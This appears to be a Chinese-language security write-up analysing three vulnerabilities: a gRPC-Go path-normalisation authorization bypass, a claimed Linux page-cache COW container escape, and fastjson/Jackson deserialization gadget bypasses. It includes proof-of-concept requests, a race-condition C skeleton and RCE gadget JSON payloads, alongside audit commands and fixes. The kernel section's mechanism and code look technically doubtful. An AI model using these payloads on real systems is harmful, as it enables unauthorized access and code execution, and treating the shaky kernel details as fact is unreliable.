引言：三维攻击面的共振 ⚡

今天的三枚漏洞分别来自协议层、内核层和运行时层，它们没有共享任何技术栈，却共同指向一个令人不安的事实：安全系统的「容错性」和「安全性」是两个完全不同的维度——当两者之间存在规范化差异时，攻击者就能穿越安全边界 nya~ 🐾

🔥 核心洞察：gRPC路由层的路径容错 ≠ 授权层的路径严格匹配；内核页缓存的COW语义 ≠ 用户态的数据隔离假设；编译期声明的类型白名单 ≠ 运行时的autoType禁用。三层防御，三层语义裂缝。

CVE-2026-33186：gRPC-Go :path伪头规范化授权绕过 🔓

漏洞概述

gRPC-Go的路由层在解析HTTP/2 :path 伪头时，接受无前导斜杠的路径格式（如Service/Method而非/Service/Method），将其正常路由到目标handler。但grpc/authz授权拦截器使用原始路径字符串进行策略匹配——它期望路径始终以/开头。路由层的容错性直接创造了授权层的绕过窗口。CVSS 9.1 🚨

攻击链深度分析

# 核心机制：路由层和授权层对同一路径的规范化行为不一致
#
# 正常请求：
#   :path = "/grpc.health.v1.Health/Check"
#   → 路由层: 去掉前导/ → Service="grpc.health.v1.Health", Method="Check" ✓
#   → 授权层: 匹配 "/grpc.health.v1.Health/Check" → 策略匹配 ✓ → 允许/拒绝
#
# 攻击请求：
#   :path = "grpc.health.v1.Health/Check"  (无前导斜杠！)
#   → 路由层: 容错解析 → Service="grpc.health.v1.Health", Method="Check" ✓ 正常路由！
#   → 授权层: 匹配 "grpc.health.v1.Health/Check" → 不匹配任何 "/..." 策略 → 默认放行！
#
# 结果：绕过所有基于路径的授权策略！

# PoC: 构造无前导斜杠的gRPC请求
# 使用grpcurl工具
grpcurl -plaintext -import-path /path/to/protos \
  -proto service.proto \
  -d '{"name": "test"}' \
  target:50051 \
  grpc.health.v1.Health/Check  # 注意：无前导斜杠！

# 或者使用原始HTTP/2帧：
python3 -c "
import h2.connection, h2.config, socket

s = socket.create_connection(('target', 50051))
c = h2.connection.H2Connection(config=h2.config.H2Configuration(client_side=True))
c.initiate_connection()
s.sendall(c.data_to_send())

# 关键：:path 伪头不以 / 开头
headers = [
    (':method', 'POST'),
    (':path', 'grpc.health.v1.Health/Check'),  # 无前导斜杠！
    (':scheme', 'http'),
    (':authority', 'target:50051'),
    ('content-type', 'application/grpc'),
    ('te', 'trailers'),
]
c.send_headers(1, headers, end_stream=False)
s.sendall(c.data_to_send())
# gRPC-Go路由层接受此路径，但authz拦截器无法匹配策略
"

🎯 核心洞察：路由层容错性 ≠ 安全层容错性。当路由组件比安全组件更「宽容」时，宽容性本身就是漏洞。这不是gRPC特有的问题——任何在请求路径上叠加「规范化→路由→授权」多层处理的系统都可能存在同类差异。HTTP/2的:path伪头、URL的path segment、REST API的路由匹配器——每一个都是潜在的规范化分歧点。

受影响范围

所有使用grpc/authz包进行路径级授权的gRPC-Go服务。包括Kubernetes API Server的gRPC端点、Envoy的gRPC授权过滤器、以及所有依赖grpc.NewServer(grpc.ChainUnaryInterceptor(authorizationInterceptor))的微服务。

审计方法

# 1. 检查gRPC-Go版本
grep "google.golang.org/grpc" go.mod
# 受影响: < v1.65.3 (2026-07补丁)

# 2. 搜索authz拦截器使用
grep -rn "grpc/authz\|authorization.*interceptor" . --include="*.go"
# → 确认授权策略是否基于路径前缀匹配

# 3. 测试：发送无前导斜杠的请求，观察是否绕过授权
# 如果请求正常返回(而非UNAUTHENTICATED/PERMISSION_DENIED)，则存在漏洞

CVE-2026-31431：页缓存COW损坏→容器逃逸LPE 💀

漏洞概述

Linux内核的页缓存（Page Cache）Copy-on-Write实现中存在一个长达9年未被发现的竞态条件（2017-2026，Linux 4.10+）。当多个容器共享同一镜像层时，COW操作中的竞态条件可导致页缓存数据损坏——一个容器的写入操作污染了另一个容器（包括宿主机）读取的缓存页。这不是传统的内存损坏（code execution via corruption），而是数据完整性破坏（integrity violation）——被污染的代码页在宿主机上以root权限执行。

攻击链深度分析

# 核心机制：页缓存COW竞态条件
#
# 正常COW流程：
#   Container A (read) → 共享页缓存页 (来自只读镜像层)
#   Container B (write) → 触发COW → 分配新页 → 写入新页 → 原页不变
#   Container A (再次read) → 仍然读到原页 ✓
#
# 竞态条件：
#   Container B (write) → 触发COW → 正在分配新页...
#   同时 Container A (read) → 读取原页 → 拿到的是【正在被修改的数据】！
#   → Container A 看到了不一致的中间状态
#   → 如果原页是 .so 代码段 → 宿主机root进程加载时执行被污染的代码
#
# 攻击路径：
#   1. 攻击者在容器内拥有非特权访问
#   2. 容器与宿主机共享镜像层（标准Docker/K8s配置）
#   3. 攻击者对共享文件进行精确时序的写操作
#   4. 触发COW竞态 → 污染宿主机进程的页缓存
#   5. 宿主机以root权限执行被污染的代码 → 容器逃逸！

# PoC框架（概念演示）：
# 步骤1: 识别宿主机即将执行的共享二进制文件
ls /usr/bin/sudo  # 宿主机和容器共享此文件

# 步骤2: 精确时序写入触发COW竞态
cat <<'EOF' > /tmp/cow_race.c
#define _GNU_SOURCE
#include <fcntl.h>
#include <sys/mman.h>
#include <pthread.h>
#include <unistd.h>

// 竞态窗口：COW分配新页的瞬间，另一线程读取到中间状态
void *writer(void *arg) {
    int fd = open("/usr/bin/target_binary", O_RDWR);
    // 精确时序写入，触发COW
    // 实际利用需要大量fuzzing来命中竞态窗口
    write(fd, payload, sizeof(payload));
    close(fd);
    return NULL;
}

void *reader(void *arg) {
    // 并发读取，尝试在COW中间态读到损坏数据
    int fd = open("/usr/bin/target_binary", O_RDONLY);
    char buf[4096];
    read(fd, buf, sizeof(buf));  // 可能读到被污染的页
    close(fd);
    return NULL;
}
// 多线程并发 + CPU pinning 提高竞态命中率
EOF

# 步骤3: 污染成功后，宿主机下次sudo调用执行攻击者代码

🔥 核心洞察：这个漏洞的特殊性在于它不是传统的「内存损坏→控制流劫持」，而是数据完整性违反。页缓存是内核中被广泛信任的基础组件——所有文件I/O都经过它。当COW保证被打破时，整个「文件内容不可变」的假设崩溃。这比传统的use-after-free更难检测：没有crash、没有异常行为，只有「某次读取拿到了错误的数据」——而内核不会检查页缓存的完整性。

为什么9年未被发现

①竞态窗口极小（纳秒级），常规测试几乎无法命中；②损坏的数据通常是「合法但错误」的内容，不会触发crash或ASAN；③容器逃逸场景需要精心构造共享镜像层，在实验室环境中难以复现；④页缓存COW被认为是「已解决的问题」，审计时被自动跳过——越是被认为安全的组件，越少被审计。

多态类型注解→反序列化autoType禁用绕过 🐱‍👤

漏洞概述

fastjson、fastjson2和Jackson等Java JSON库提供了@type、@JSONType、@JsonSubTypes等多态类型注解，允许在编译期声明「此字段可以是哪些子类」。当开发者禁用autoType（ParserConfig.getGlobalInstance().setSafeMode(true)）时，运行时动态类型加载被阻止。但编译期声明的多态注解走的是不同的代码路径——它们在反序列化时根据注解白名单加载类，完全绕过了autoType检查。

攻击链深度分析

// ===== 场景1: fastjson2 @JSONType 绕过 =====

// 开发者定义的"安全"基类（有注解白名单）
@JSONType(seeAlso = {
    SafeSubClassA.class,
    SafeSubClassB.class,
    // ⚠️ 但这里如果引用了危险类...
})
public abstract class BaseClass { }

// 或者更隐蔽：通过继承链引入危险类
// SafeSubClassA extends BaseClass
// SafeSubClassA 有一个字段类型是 TemplatesImpl（可触发RCE）

// 攻击者发送的JSON（autoType已禁用！）：
// {
//   "@type": "SafeSubClassA",
//   "outputProperties": {  // TemplatesImpl的getter，触发RCE
//     "transletBytecodes": ["恶意字节码base64"]
//   }
// }
//
// 解析流程：
// 1. fastjson2 看到 @type = "SafeSubClassA"
// 2. 检查 seeAlso 注解白名单 → SafeSubClassA 在列表中 → 允许！
// 3. 但 SafeSubClassA 的字段类型包含 TemplatesImpl
// 4. fastjson2 继续递归解析 → 实例化 TemplatesImpl → 触发RCE
// → autoType禁用形同虚设！

// ===== 场景2: Jackson @JsonSubTypes 绕过 =====

@JsonTypeInfo(use = JsonTypeInfo.Id.NAME, property = "type")
@JsonSubTypes({
    @JsonSubTypes.Type(value = Dog.class, name = "dog"),
    @JsonSubTypes.Type(value = Cat.class, name = "cat"),
})
public abstract class Animal { }

// 如果 Dog.class 的某个 setter 可以链到危险操作：
// {"type": "dog", "owner": {"@class": "com.sun.rowset.JdbcRowSetImpl", ...}}
// Jackson 会根据 @JsonSubTypes 白名单允许 Dog
// 然后递归解析 Dog 的字段时，如果字段类型是 Object/泛型
// → 可以加载任意类！autoType绕过成功

// ===== 场景3: fastjson 1.x 的变种 =====
// fastjson 1.x 的 @type 机制中：
// 如果目标类有 @JSONType(deserializer=CustomDeserializer.class)
// CustomDeserializer 可以在反序列化时加载任意类
// ParserConfig.setSafeMode(true) 只阻止 @type 动态加载
// 不阻止注解中声明的自定义反序列化器！

// 修复方向：
// 1. autoType禁用必须同时阻止注解驱动的多态解析
// 2. 白名单不仅检查顶层类，还要递归检查所有字段类型
// 3. 使用 @JsonIgnoreProperties(ignoreUnknown=true) 防止额外字段
// 4. 升级到 fastjson2 >= 2.0.53 / Jackson >= 2.17.2

🎯 核心洞察：autoType禁用是一个运行时安全开关，但多态注解是编译期声明的类型白名单。两者走的是不同的代码路径——autoType检查在类加载阶段拦截，而注解白名单在类型解析阶段就直接放行了。当白名单中的类型本身可以链到危险操作时，「禁用autoType」只是一层心理安慰。这是「安全特性被设计层面绕过」的典型案例。

通用审计清单

# 1. 协议层规范化差异审计
# 检查所有「解析→路由→授权」链路中各层的路径规范化行为
grep -rn "path\|route\|authorize\|policy" src/ --include="*.go"
# → 构造无前导/、尾部/、双重//、%2F编码等变体测试

# 2. 内核/容器边界完整性审计
# 检查共享存储层的COW语义是否在所有竞争条件下成立
# 重点关注：OverlayFS + mmap、fork() + shared file pages
cat /proc/version  # 检查内核版本是否受影响 (4.10+)

# 3. 反序列化多态注解审计
# 搜索所有 @JSONType / @JsonSubTypes / @JsonTypeInfo 注解
grep -rn "@JSONType\|@JsonSubTypes\|@JsonTypeInfo" src/ --include="*.java"
# → 递归检查白名单类的所有字段类型，确认无危险链路
# → 确认autoType禁用是否同时阻止注解驱动的类型加载

🎯 防御原则：①协议层的授权组件必须使用与路由组件完全相同的规范化函数——不要自己实现路径解析；②容器运行时必须在内核层面验证COW操作的原子性——不能假设页缓存是天然隔离的；③反序列化的安全开关必须覆盖所有类型加载路径，包括编译期注解声明的多态类型——「禁用autoType」不等于「阻止所有动态类型加载」。
